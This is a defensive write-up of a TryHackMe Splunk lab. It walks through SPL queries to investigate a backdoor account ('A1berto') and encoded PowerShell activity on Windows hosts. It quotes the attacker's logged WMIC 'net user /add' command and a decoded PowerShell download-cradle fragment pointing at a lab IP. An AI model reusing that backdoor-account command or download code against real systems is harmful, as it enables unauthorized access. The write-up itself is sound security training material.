# Investigating with Splunk — SOC Walkthrough

A step-by-step investigation of suspicious Windows activity using Splunk.

- **Platform:** TryHackMe
- **Room:** [Investigating with Splunk](https://tryhackme.com/room/investigatingwithsplunk)
- **Index:** `main`
- **Data sources:** Windows Security, Sysmon and PowerShell logs

> Findings are based on the provided training materials. Verify the results in your own lab environment.

## Table of Contents

- [Splunk Basics](#splunk-basics)
- [Notable Investigation](#notable-investigation)
- [Event ID Reference](#event-id-reference)
- [Investigation Scenario](#investigation-scenario)
- [Questions and Investigation Steps](#questions-and-investigation-steps)
- [Timeline and Further Investigation](#timeline-and-further-investigation)
- [SOC Incident Summary](#soc-incident-summary)
- [References](#references)

## Splunk Basics

Splunk is a data analytics platform used to collect, search, analyze and visualize machine data.

**Splunk Enterprise Security** adds SIEM capabilities for security monitoring, threat detection and incident investigation.

| Function | Description |
|---|---|
| Log Management | Centralizes logs from systems, applications and security tools. |
| Search and Analytics | Uses SPL queries to investigate events and related activity. |
| Security Monitoring | Detects suspicious behavior through configured detection rules. |
| Alerting | Generates alerts when defined conditions are met. |
| Visualization | Presents findings through dashboards, charts and reports. |

### Email Monitoring Example

In the pre-test exercise, a user received nine emails and only one was malicious.

If email security logs are ingested into Splunk and an appropriate detection rule is configured, suspicious activity can generate an alert.

```spl
index=email_logs sourcetype=email
recipient="user@example.com"
(subject="*urgent*" OR subject="*invoice*")
```

This query narrows the search to candidate emails. Subject keywords alone do not establish maliciousness.

Review the sender, URLs, attachments, authentication results and the email security tool's verdict. Field names depend on the data source.

## Notable Investigation

When investigating a notable in Splunk Enterprise Security:

1. **Read the alert:** Review the description, detection rule and triggering conditions.
2. **Identify the entities:** Record the user, source IP, destination host and time.
3. **Review raw events:** Examine the logs that generated the alert.
4. **Interpret the outcome:** Confirm what `success`, `failure`, `allowed` or `blocked` means in that source.
5. **Correlate activity:** Investigate related events before and after the alert.
6. **Enrich the evidence:** Review reputation, asset context and user behavior.
7. **Document the decision:** Record the evidence and rationale, then close or escalate according to procedure.

> A failed action or clean IP reputation alone does not justify closing an alert.

## Event ID Reference

| Data Source | Event ID | Description |
|---|---:|---|
| Windows Security | 4624 | Successful logon |
| Windows Security | 4625 | Failed logon |
| Windows Security | 4688 | Process creation |
| Windows Security | 4720 | User account creation |
| Sysmon | 1 | Process creation |
| Sysmon | 3 | Network connection |
| Sysmon | 11 | File creation |
| Sysmon | 12 | Registry object creation or deletion |
| Sysmon | 13 | Registry value set |
| Sysmon | 14 | Registry key or value rename |
| PowerShell Operational | 4103 | Module logging |
| PowerShell Operational | 4104 | Script Block Logging |

Always interpret an Event ID together with its provider, log channel and event content.

> Sysmon Event ID 3 records network connections. It is not direct evidence of a user logon.

## Investigation Scenario

SOC Analyst Johny observed anomalous behavior across several Windows hosts. An adversary may have accessed these systems and created a backdoor account.

The collected logs are available in Splunk's `main` index.

Our objectives are to:

- Identify the new account and its registry entry.
- Analyze the remote account creation command.
- Investigate logon attempts.
- Identify suspicious PowerShell activity.
- Decode the web request target.

### Lab Setup

1. Start the room machine.
2. Access Splunk using the assigned IP address.
3. Open **Search & Reporting**.
4. Set the time range to **All time**.

> This lab uses `EventID` and `Hostname`. Other environments may use fields such as `EventCode`, `Computer` or `ComputerName`. Check the raw event if a field is missing.

## Questions and Investigation Steps

### Q1. How many events were collected and Ingested in the index main?

#### Investigation Goal

Establish the size and scope of the dataset.

#### SPL Query

```spl
index=main
```

To display the count:

```spl
index=main
| stats count AS total_events
```

#### Answer

```text
12256
```

#### SOC Analysis

The index contains **12,256 events**. This represents the dataset size, not the number of malicious events.

Confirm the time range is **All time**.

To review the dataset's time boundaries:

```spl
index=main
| stats count AS total_events
        min(_time) AS first_event
        max(_time) AS last_event
| convert ctime(first_event) ctime(last_event)
```

To identify available sources:

```spl
index=main
| stats count BY sourcetype source
| sort - count
```

---

### Q2. On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username?

#### Investigation Goal

Identify account creation activity using Windows Security Event ID **4720**.

#### SPL Query

```spl
index=main EventID=4720
```

If the fields are available:

```spl
index=main EventID=4720
| table _time Hostname SubjectUserName TargetUserName TargetSid
```

#### Evidence Review

Examine:

- **New Account / TargetUserName:** The created account.
- **Subject / SubjectUserName:** The initiating security context.
- **Hostname:** The system associated with the event.
- **_time:** The event timestamp.

#### Answer

```text
A1berto
```

#### SOC Analysis

The username uses the digit **1** instead of the lowercase letter **l**.

| Legitimate Account | Suspicious Account |
|---|---|
| `Alberto` | `A1berto` |

This similarity supports an attempt to make the new account resemble a legitimate user.

The Subject account identifies the security context of the action. It does not establish that the account's human owner performed the attack.

---

### Q3. On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?

#### Investigation Goal

Find registry activity associated with the new account.

#### SPL Query

```spl
index=main A1berto (EventID=12 OR EventID=13 OR EventID=14)
| table _time Hostname EventID EventType Image TargetObject Details
| sort 0 _time
```

A narrower search:

```spl
index=main A1berto EventID=13
```

#### Evidence Review

Inspect the **TargetObject** field.

Compare the hostname and timestamp with the account creation event from Q2.

#### Answer

```text
HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto
```

#### SOC Analysis

This path is associated with the account's entry in the Windows SAM database.

It supports the account creation finding. It does not independently prove that the attacker established a registry autostart persistence mechanism.

---

### Q4. Examine the logs and identify the user that the adversary was trying to impersonate.

#### Investigation Goal

Identify the legitimate account that the new username resembles.

#### SPL Query

```spl
index=main
| stats count BY User
| sort - count
```

Alternatively, run:

```spl
index=main
```

Then inspect the **User** field in the field panel.

#### Answer

```text
Alberto
```

#### SOC Analysis

The suspicious account `A1berto` resembles the legitimate account `Alberto`.

This supports username imitation. It does not prove credential theft, token impersonation or compromise of the legitimate account.

---

### Q5. What is the command used to add a backdoor user from a remote computer?

#### Investigation Goal

Identify the command through process creation events:

- **Sysmon Event ID 1**
- **Windows Security Event ID 4688**

#### SPL Query

```spl
index=main A1berto (EventID=1 OR EventID=4688)
| table _time Hostname EventID User Image ParentImage CommandLine
| sort 0 _time
```

#### Evidence Review

Inspect **CommandLine** for `WMIC.exe` and `net user`.

#### Answer

```text
"C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"
```

> Analyze this command as log evidence. Running it is not required for the investigation.

#### Command Breakdown

| Component | Meaning |
|---|---|
| `WMIC.exe` | Tool used to perform WMI operations |
| `/node:WORKSTATION6` | Remote target host |
| `process call create` | Request to create a process on the target |
| `net user /add` | User account creation |
| `A1berto` | New username |
| `paw0rd1` | Password shown in the command |

#### SOC Analysis

The command targets `WORKSTATION6` and requests creation of the new account.

Distinguish the host where the command was logged from the remote target specified by `/node:`.

The process creation event records command execution. Correlate it with Event ID 4720 to support successful account creation.

---

### Q6. How many times was the login attempt from the backdoor user observed during the investigation?

#### Investigation Goal

Determine whether the new account appears in successful or failed logon events.

#### SPL Query

```spl
index=main A1berto (EventID=4624 OR EventID=4625)
| stats count AS observed_logon_events
```

If the target account is extracted into `TargetUserName`:

```spl
index=main (EventID=4624 OR EventID=4625)
TargetUserName="A1berto"
| stats count AS observed_logon_events
```

#### Answer

```text
0
```

#### SOC Analysis

No successful or failed logon event for `A1berto` was observed in the available dataset.

This does not prove the account was never used. Log coverage, retention and auditing settings limit the conclusion.

A search for `User="A1berto"` alone is insufficient because account information may appear in a different field or domain-qualified format.

---

### Q7. What is the name of the infected host on which suspicious Powershell commands were executed?

#### Investigation Goal

Identify the host associated with the PowerShell activity.

#### SPL Query

```spl
index=main powershell
| stats count BY Hostname
| sort - count
```

To focus on PowerShell logging events:

```spl
index=main (EventID=4103 OR EventID=4104)
| stats count BY Hostname
| sort - count
```

#### Answer

```text
James.browne
```

#### SOC Analysis

In this lab, `James.browne` is a value in the **Hostname** field.

Do not assume Splunk's `host` metadata field always identifies the endpoint where an event occurred. Verify it against the event content.

PowerShell usage alone is not malicious. Evaluate the encoded command, script behavior and related activity.

---

### Q8. PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?

#### Investigation Goal

Count the relevant PowerShell logging records on the identified host.

#### SPL Query

```spl
index=main Hostname="James.browne" EventID=4103
| stats count AS powershell_events
```

To compare logging event types:

```spl
index=main Hostname="James.browne"
(EventID=4103 OR EventID=4104)
| stats count BY EventID
```

#### Answer

```text
79
```

#### SOC Analysis

The result represents **79 event records**.

A single PowerShell execution can generate multiple logging events. This count does not establish 79 separate commands, processes or attacks.

- **4103:** Module logging.
- **4104:** Script Block Logging.
- **Transcription:** A separate logging feature.

---

### Q9. An encoded Powershell script from the infected host initiated a web request. What is the full URL?

#### Investigation Goal

Extract the encoded PowerShell command and identify its web request target.

#### Step 1: Extract the Command

```spl
index=main Hostname="James.browne"
(EventID=4103 OR EventID=4104)
| rex field=ContextInfo "Host Application = (?<Command>[^\r\n]+)"
| where isnotnull(Command)
| dedup Command
| table Command
```

| Query Component | Purpose |
|---|---|
| `rex` | Extracts content using a regular expression |
| `field=ContextInfo` | Specifies the field to inspect |
| `(?<Command>...)` | Stores extracted text in the `Command` field |
| `[^\r\n]+` | Captures text until the end of the line |
| `dedup Command` | Removes duplicate command values |

If no result appears, inspect the raw event for the **Host Application** section.

#### Step 2: Isolate the Base64 Value

The command has this structure:

```text
powershell.exe -noP -sta -w 1 -enc <Base64>
```

Copy only the Base64 value after **`-enc`**.

#### Step 3: Decode the First Layer

Open [CyberChef](https://gchq.github.io/CyberChef/) and apply:

1. **From Base64**
2. **Decode text**
3. Encoding: **UTF-16LE**

PowerShell's `-EncodedCommand` parameter uses a Base64 representation of UTF-16LE text.

> Base64 is encoding, not hashing or encryption. Review decoded content as text without executing it.

#### Step 4: Locate the Inner Base64 Value

The decoded script contains:

```powershell
$ser=$([Text.Encoding]::Unicode.GetString(
[Convert]::FromBase64String(
'aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA=='
)));
$t='/news.php'
```

Decode the inner value:

```text
aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==
```

Use the same CyberChef recipe:

```text
From Base64
Decode text: UTF-16LE
```

Output:

```text
http://10.10.10.5
```

#### Step 5: Assemble the URL

The path is:

```powershell
$t='/news.php'
```

The script uses:

```powershell
DownloadData($ser+$t)
```

Combining the server address and path gives:

```text
http://10.10.10.5/news.php
```

#### Step 6: Defang the URL

Apply CyberChef's **Defang URL** operation.

#### Answer

```text
hxxp[://]10[.]10[.]10[.]5/news[.]php
```

#### SOC Analysis

The script contains code intended to download data from this address.

Script content alone does not prove:

- A successful connection.
- A completed download.
- Execution of downloaded content.
- A confirmed command-and-control channel.

Validate these conclusions using network and endpoint telemetry.

`10.10.10.5` is a private IP address and should not be described as an external internet destination.

## Timeline and Further Investigation

### Build a Timeline

```spl
index=main
(
    A1berto
    OR
    (Hostname="James.browne" (EventID=4103 OR EventID=4104))
)
| table _time Hostname EventID User Image CommandLine TargetObject ContextInfo
| sort 0 _time
```

For each relevant event, record:

| Evidence | Purpose |
|---|---|
| Timestamp | Establish event order |
| Source host | Identify where activity originated |
| Target host | Identify the destination |
| User | Determine the security context |
| Process and command line | Understand the action |
| Supporting event | Connect the conclusion to evidence |

Build the actual chronology from your lab timestamps.

### Investigate Network Connections

```spl
index=main EventID=3 DestinationIp="10.10.10.5"
| table _time Hostname Image User DestinationIp DestinationPort ProcessGuid
| sort 0 _time
```

An empty result does not prove that no connection occurred. Sysmon network logging may be disabled or outside the collected scope.

### Investigate File Creation

```spl
index=main Hostname="James.browne" EventID=11
| table _time Hostname Image TargetFilename ProcessGuid
| sort 0 _time
```

Correlate results with the PowerShell timestamp and process identifiers.

### Investigate the Process Chain

```spl
index=main Hostname="James.browne"
(EventID=1 OR EventID=4688) powershell
| table _time User ParentImage Image CommandLine ProcessGuid
| sort 0 _time
```

The parent process helps explain how the PowerShell activity started.

## SOC Incident Summary

**Incident:** Suspicious account creation and encoded PowerShell activity.

The dataset contains **12,256 events**. Windows Security logs identify creation of the account **`A1berto`**, whose name resembles the legitimate account **`Alberto`**.

An associated SAM registry entry and a WMIC command targeting **`WORKSTATION6`** support the account creation finding. No successful or failed logon event for the new account was observed in the available data.

The host **`James.browne`** contains **79 Event ID 4103 records** associated with the investigated PowerShell activity.

Decoding the script reveals code intended to download data from:

```text
hxxp[://]10[.]10[.]10[.]5/news[.]php
```

The evidence supports suspicious account creation and PowerShell behavior. Successful network connection, download and payload execution require additional verification.

## References

- [TryHackMe — Investigating with Splunk](https://tryhackme.com/room/investigatingwithsplunk)
- [Microsoft — Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Microsoft — PowerShell Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1)
- [CyberChef](https://gchq.github.io/CyberChef/)
- User-provided PDF: `investigation with Splunk PDF.pdf`
- User-provided walkthroughs by jcm3, igor_sec, Enes Cayvarli, Matt Eaton and B_the_Ripper











































